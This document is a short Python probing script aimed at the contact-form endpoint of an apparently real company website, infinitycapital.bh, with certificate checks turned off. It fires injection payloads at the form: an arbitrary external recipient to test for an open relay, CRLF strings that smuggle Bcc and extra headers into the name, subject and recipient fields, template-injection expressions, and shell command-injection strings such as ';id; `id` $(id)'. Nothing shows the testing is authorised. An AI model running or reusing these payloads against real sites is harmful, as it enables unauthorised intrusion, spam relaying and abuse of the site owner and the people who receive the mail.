import json, urllib.request, urllib.parse, ssl, time
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
BASE="https://www.infinitycapital.bh/api/send"
def post(fields):
    r=urllib.request.Request(BASE,data=urllib.parse.urlencode(fields).encode(),
      headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0'})
    try:
        with urllib.request.urlopen(r,context=ctx,timeout=30) as resp:
            return resp.status, resp.read().decode('utf-8','replace')
    except Exception as e:
        try: return e.code, e.read().decode('utf-8','replace')
        except Exception: return 'ERR', str(e)

def base(**kw):
    f={'fname':'aa','lname':'bb','areacode':'973','tel':'1234',
       'cname':'test.investigator@protonmail.com','subject':'hello','msg':'markerZZ91',
       'check':'true','targets':'info@infinitycapital.bh'}
    f.update(kw); return f

cases=[
 ("ARBITRARY EXTERNAL RECIPIENT", base(targets='security.verify.recipient@protonmail.com', msg='IC-RELAY-TEST-MARKER-A1')),
 ("CRLF HEADER INJ in fname", base(fname='aa\r\nBcc: victim@protonmail.com', msg='IC-CRLF-TEST-B2', targets='info@infinitycapital.bh')),
 ("CRLF in subject", base(subject='hi\r\nX-Injected: yes', msg='IC-CRLF-TEST-C3', targets='info@infinitycapital.bh')),
 ("CRLF in targets", base(targets='info@infinitycapital.bh\r\nBcc:evil@protonmail.com', msg='IC-CRLF-TEST-D4')),
 ("SSTI msg {{7*7}}", base(msg='{{7*7}} ${7*7} <%= 7*7 %> #{7*7}', targets='info@infinitycapital.bh')),
 ("CMDi msg", base(msg=';id; `id` $(id)', targets='info@infinitycapital.bh')),
]
for n,f in cases:
    s,b=post(f); print(n,'->',s,b[:260]); print()
    time.sleep(2)
